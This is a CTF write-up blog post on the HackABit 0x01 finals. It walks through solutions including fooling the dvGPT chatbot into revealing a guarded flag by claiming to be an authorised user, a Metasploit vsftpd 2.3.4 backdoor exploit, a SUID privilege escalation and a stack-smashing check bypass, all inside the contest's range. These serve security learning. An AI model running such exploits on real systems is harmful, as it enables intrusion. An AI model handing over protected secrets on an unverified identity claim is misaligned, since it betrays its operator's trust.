+++
author = "CodeAPretzel"
title = "HackABit-0x01 Finals"
date = "2023-07-13"
description = "CTF challenges and their solutions ranging from prompt engineering, reverse engineering, network forensics, and infiltration."
tags = [
    "ctf",
    "writeup",
]
cover = "cover.png"
+++


## INFO -

HackABit (HAB), is a CTF competition that competitors try to exploit challenges to receive a flag hidden in a vulnerability to earn points in a leaderboard. Together, we will go over the challenges I was able to complete and my approach to them. **Note:** the HAB domain is not active anymore.

---

### Table of Contents -

| 🟢 dvGPT ________________________________________________________|
| ------------- |
| [Leaky](#leaky) |
| [Extractor](#extractor) |
  
| 🟢 Corruption ___________________________________________________|
| ------------- |
| [Santa](#santa) |
| [Coredump](#coredump) |

| 🟢 Triage _______________________________________________________|
| ------------- |
| [Sluth](#sluth) |
| [Inspector](#inspector) |
| [Coverup](#coverup) |

| 🟢 Range ________________________________________________________|
| ------------- |
| [Connection](#connection) |
| [Rightface](#rightface) |
| [Leftface](#leftface) |
  
  
If you want the full writeups and all of their challenges, check out the following link: [`here`](https://github.com/Shift-Cyber/hab-challenges-public/tree/main/0x01/round_3)

---

# Leaky

> People leave dumb comments about vulnerabilities all over client-side code... most modern web applications don't display all the possible code at once though, for a variety of reasons. https://wtashuxsyj.final.hackabit.com/

## Solution ~
This one was not as quick as the other challenges because we had a lot of source code to look through. Nonetheless, when the website loads, if we pull up the inspect tool we can see some console logs that display:

`Connecting to websocket server...`

If we go to the script that displayed this console log we can see an interesting comment:

`this.connection = io(this.deriveWsURL());`

Which is mainly getting the connection from us, then we see some check statements below. Commenting out this just disables the checks, so that's nice, but if we scroll to the top of the script we can see the flag in two different fields as shown below:

{{< image src="./imgs/console-log.jpg" alt="Inspect Flag" width="auto" height="auto" >}}

Thus we get the **🚩 flag{the_DOM_is_like_crazy_virtual_maaaan}**

# Extractor

> We gave dvGPT a flag and for some reason trust it to keep it safe. These AIs are super duper secure my dude. https://wtashuxsyj.final.hackabit.com/

## Solution ~
This challenge was by far my favorite becuase it was fun trying to convince the AI to give us the flag. During your conversation, the AI will not give you the flag unless you are *Robert*.

However, if you just imply that you are Robert, the AI will give you the flag just like that:

{{< image src="./imgs/i-am-robert.jpg" alt="I am Robert" width="auto" height="auto" >}}

Nice, now we get the **🚩 flag{hey_you're_not_robert}**

---

# Santa

> You all asked for it so here it is, an intro to binary exploitation! Let's get started nice and simple, baby steps to reverse engineering (RE). All challenges in this section use the same binary. The target is x86 and ASLR is on but it shouldn't be relevant to any of your exploits. Download the file here: [Corruption](./download/corruption)

## Solution ~
Another easy one, maybe not at first glance though. This entire section of corruption is about reverse engineering; getting into the core of code and finding out what's inside. Though, it really is just baby steps first.

So, in order to solve this one, we have two options: **1.** read the raw file to see if there is anything interesting or **2.** use our favorite decompiler tool to reorganize through the mess and find what we can. In my first run of this, I decided to do the first option and, after some sifting, found the flag covered in plaintext.

{{< image src="./imgs/grep-corruption.jpg" alt="Flag bro..." width="auto" height="auto" >}}

And there we have it
**🚩 flag{baby_steps_gift_just_for_you}**

# Coredump

> Now that we have at least inspected the binary, lets go a bit deeper. You can't just overflow the buffer with a bunch of A's--reverse engineer the software and figure out your payload format. Smash the stack to get the flag, no control necessary yet. Once you have a working exploit, fire it against the remote target to get the real flag. All challenges in this section use the same binary. The target is x86 and ASLR is on but it shouldn't be relevant to any of your exploits. **juieqtrsdp.final.hackabit.com:54321** [Corruption](./download/corruption)


## Solution ~
This time, we have to decomplie the file. First step is to use your favorite reverse engineering tool, I used Ghidra. Next, I looked through the *main* function of this file to see what we can get out of this:

<br>

{{< code language="c" title="main.c" id="1" expand="Show" collapse="Hide" isCollapsed="false" >}}
undefined4 main(void)

{
  size_t __n;
  int iVar1;
  char *param1;
  char local_23e [500];
  undefined local_4a [50];
  char *local_18;
  int local_14;
  undefined *local_10;
  
  local_10 = &stack0x00000004;
  local_14 = 0;
  local_18 = "UNLOCK";
  printf("You might need this: %p\n",flag_function);
  printf("this might help too: %p\n",local_23e);
  printf("Talk to me Maverick: ");
  fflush((FILE *)0x0);
  fgets(local_23e,500,stdin);
  fflush((FILE *)0x0);
  __n = strlen(local_18);
  iVar1 = strncmp(local_23e,local_18,__n);
  if (iVar1 == 0) {
    puts("Copying into the destination now...");
    fflush((FILE *)0x0);
    memcpy(local_4a,local_23e,0x3c);
    if (local_14 != 0) {
      param1 = getenv("HAB_COREDUMP");
      printf("STACK SMASHING DETECTED... but we\'ll allow it ;) %s\n",param1);
      fflush((FILE *)0x0);
    }
    vulnerable_function(local_23e);
  }
  return 0;
}
{{< /code >}}

<br>

As we can see in the function, the value `local_18 = "UNLOCK";` is the first check for if `(iVar1 == 0)`. This happens because of the string compare right above. `strncmp` will compare our input to `"UNLOCK"`, find the difference, and return 0 if true to the value of `iVar1`.

{{< image src="./imgs/coredump-ghidra.jpg" alt="Ghidra" width="auto" height="auto" >}}

Now we run the script with UNLOCK on the host given to us in the challenge:

{{< image src="./imgs/coredump-session.jpg" alt="Session" width="auto" height="auto" >}}

And get: **🚩 flag{look_like_ur_a_real_RE}**

---

# Sluth

> Everything in life is iterative... [Morse.txt](./download/morse.txt)


## Solution ~
As the challenge says, life is iterative... iterative...

Let's start by going to our favorite decrypting tool, [cyberchef!](https://gchq.github.io/CyberChef/)

We can start with this challenge by using the `From Morse Code` section to condense this into, what appeared to be, more morse code. Do this a few times and you will get the flag for this challenge.

[`Cyberchef Recipe`](https://gchq.github.io/CyberChef/#recipe=From_Morse_Code('Forward%20slash','Line%20feed')From_Morse_Code('Forward%20slash','Line%20feed')From_Morse_Code('Forward%20slash','Line%20feed')From_Morse_Code('Forward%20slash','Line%20feed')From_Morse_Code('Forward%20slash','Line%20feed'))

{{< image src="./imgs/morse-code.jpg" alt="Chef Coder or Whatever..." width="auto" height="auto" >}}

🚩 <b>FIVE_TIMES_0.O</b>

# Inspector

> It's just a simple stream challenge, how hard can it be? Both challenges for this section use the same pcapng file. [Triage.pcapng](./download/triage.pcapng)

## Solution ~
This challenge had me stumped for a little bit. My initial thought was to go through the TCP and HTTP streams, which only TCP was correct. There were about 500+ packets and I went through each and every one of them until I got the challenge's flag:

{{< image src="./imgs/wireshark-inspector.jpg" alt="Stream" width="auto" height="auto" >}}

Also, interesting to note by a competitior is that TCP streams reveal more information than HTTP streams because TCP's provides a lower-level, more comprehensive outline of the data being transmitted. So, if I only followed the HTTP stream, I would get the following:

```
GET / HTTP/1.1
Host: www.hackabit.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Connection: close
```

But a TCP stream would give me this:

```
GET / HTTP/1.1
Host: www.hackabit.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Connection: close

fl_nosearch_ag{tcp_streams_reveal_more}
```

**🚩 fl_nosearch_ag{tcp_streams_reveal_more}**

# Coverup

> There is a challenge hidden in coverup.jpg, extract the flag and profit. [Challenge.jpg](./download/challenge.jpg)


## Solution ~
This challenge is was very interesting to say the least. My first thought was to see if the challenge had any interesting EXIF data but was provided with nothing:

```
ExifTool Version Number         : 12.57
File Name                       : challenge.jpg
Directory                       : .
File Size                       : 360 kB
File Modification Date/Time     : 2023:05:21 09:29:10-05:00
File Access Date/Time           : 2023:06:04 17:12:13-05:00
File Inode Change Date/Time     : 2023:05:21 09:29:10-05:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Image Width                     : 1024
Image Height                    : 1024
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 1024x1024
Megapixels                      : 1.0
```

I then thought that this image might have some steganography put on it. I used [steghide](https://steghide.sourceforge.net/) and the following command, `steghide extract -sf challenge.jpg`. The program does ask for a password, however, none was needed and if there was a password then steghide would try to crack it.

{{< image src="./imgs/steghide-term.jpg" alt="Steghide" width="auto" height="auto" >}}

**🚩 flag{the_truth_is_burried_deep}**

---

# Connection

> This section is a series of challenges in a semi-isolated cyber range. Your goal is to compromise the boxes and get the flags. Your first challenge is more of a sanity-check/confirmation. We wanted to use private keys for this but logistics of distributing them was challenge so its just password login for now. Check your email, at exactly 5pm PST Friday you received a credential and IP address for this jumpbox. You can also use the connection info listed below. You will use this jumpbox to attack other machines in the network. We've installed nmap, metasploit and netcat for your convience. If you want other tooling installed later please reach out to staff and will consider those requests as you ask. Remember that you can use techniques like proxychains over SSH to emulate much of this functionality. `range.final.hackabit.com`
    
## Solution ~
This challenge was pretty simple. All we had to do was connect to the server and look around for the flag. As the challenge says, we get an email with the public ip, `forgot what it was`, and we have to `SSH` into this with our username and password:
    
```bash
-$ ssh [username]@[host]
    
Add this connection, blah blah blah

- Password ->
    
- We're In
    
-$
```

Next we look for the flag on the server. We could do this in two ways. Search for it or use `find / -name flag`. I used the second option and thank goodness they didn't decide to change the name on us for this one. Read the file and got **🚩 flag{welcome_to_the_range}**

# Rightface

> If you did the more advanced challenges during the qualifier this should already be familiar. Your goal here is to compromise the `10.128.0.5` machine and get access as the `breakme` user. Remember that there may be non-vulnerable services on the machine. Recon is the #1 priority. Keep this shell open once you have it, you'll need it for `Left Face`. `range.final.hackabit.com`
    
## Solution ~
When I first connect to the host, the terminal session had basic functionalities, so I ran bash to get at least a basic hud.

This gives us a little bit more control over our session. Alright, onto business, first we'll use `nmap -p- 10.128.0.5` to get any available ports. We find two at `ports 21 & 22`. Doing a further scan to discover any vulnerabilities on these ports we run `nmap -p 21,22 -script=vuln 10.128.0.5` and get a vulnerability for port 21 running `vsftpd 2.3.4` with the description saying that we can run a <a href="https://en.wikipedia.org/wiki/Backdoor_(computing)">backdoor</a> on it.

<br>

I used <a href="https://www.metasploit.com/">Metasploit</a> to create this backdoor on the connection:

```
[username]@[host]-$ msfconsole

- Cool Icon :) -

## Go to vsftpd backdoor
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor

## Set our target
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set rhost 10.128.0.5

## FIRE!
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
```

After running this, we gain access to the `breakme` user and we are able to get the flag that's in the home directory of the user.

`cat flag.txt -> flag{remember_this_one?_pays_to_be_a_winner}`

# Leftface

> With access to `10.128.0.5` your goal is to escelate priveleges to the `breakme-harder` user. Ultimately your goal is simply to read out the flag in `/home/breakme-harder/`. `range.final.hackabit.com`
    
## Solution ~
From the previous challenge `Rightface`, we are still in the shell and are told to read a text file in the directory of the `breakme-harder` user. Using just cat will not work because we don't have the premissions to do so. Instead, we look at the files given to us in the `breakme` user:

```bash
-$ ls -l

## Looks something like:

[permissions and such] -- escalator
[permissions and such] -- escalator.c
[permissions and such; can only be read by breakme-hader] -- flag.txt
```

The <i>C</i> script `escalator.c` seems interesting. Upon further investigation into the file we get:

{{< code language="c" title="escalator.c" id="2" expand="Show" collapse="Hide" isCollapsed="false" >}}
#include <stdio.h>

int main(int argc, char *argv[]) {
    FILE *file;
    char ch;

    // Check if a filename argument is provided
    if (argc < 2) { return 1; }

    // Open the file in read mode
    file = fopen(argv[1], "r");
  
    // Check if the file was opened successfully
    if (file == NULL) {
        printf("An error occured.\n");
        return 1;
    }

    // Read and print each character from the file
    while ((ch = fgetc(file)) != EOF) {
        putchar(ch);
    }

    // Close the file
    fclose(file);

    return 0;
}
{{< /code >}}

It seems this script takes the argument of a file and displays the contents. If we also look at the file's SUID, it is owned by the `breakme-harder` user, with global executing premission enabled. This means we can run the script without having to be the `breakme-harder` user, but running this script would be like the `breakme-harder` user is running it. Now all we have to do is run the file and have the flag file as the argument:

```
-$ ./escalator /home/breakme-harder/flag.txt
-$ flag{evaluate_this_my_dude}
```

<br>
<br>

## Final Notes ~
I would have done the last challenge `Aboutface` and the `King of the Hill (KOTH)` parts as well, however the KOTH was on the host of `Aboutface` and the machine of that challenge shutdown in a little bit over a day into the competition.

Funny enough too, towards the end of the competition, one of the competitiors ran a [FORKBOMB](https://en.wikipedia.org/wiki/Fork_bomb) on the main server and basically shut everything down. 

Overall, an amazing competition and I learned a lot from this!